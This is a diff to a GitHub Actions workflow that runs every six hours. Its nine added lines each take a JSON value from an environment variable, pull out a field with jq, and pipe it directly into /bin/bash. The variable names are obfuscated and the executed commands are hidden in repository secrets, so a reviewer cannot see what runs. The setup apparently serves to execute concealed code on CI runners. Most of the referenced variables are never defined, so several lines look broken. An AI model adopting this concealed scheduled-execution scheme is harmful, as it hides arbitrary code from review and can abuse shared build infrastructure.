@@ -1,9 +1,9 @@
 name: xiaomuzhi5678
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 0/6 * * *'
+    - cron: '26 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,9 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: xiaomuzhi5678
         env:
-          frvg8131: ${{ secrets.frvg8131 }}
+          ojru568: ${{ secrets.ojru568 }}
         run: |
-          echo $frvg8131 | jq -r .othn6957 | /bin/bash
-          echo $f147 | jq -r .u6 | /bin/bash
-          echo $oh1 | jq -r .t9 | /bin/bash
+          echo $ojru568 | jq -r .kai75911 | /bin/bash
+          echo $nbbc791 | jq -r .v5649 | /bin/bash
+          echo $txcw87592 | jq -r .mbjf3 | /bin/bash
+          echo $gxe8064 | jq -r .mnf18389 | /bin/bash
+          echo $aia527 | jq -r .dnzys78 | /bin/bash
+          echo $aqno249 | jq -r .yyc18 | /bin/bash
+          echo $y6516 | jq -r .ip45186 | /bin/bash
+          echo $vk196 | jq -r .ih9587 | /bin/bash
+          echo $koaxl3 | jq -r .izgsj642 | /bin/bash
 
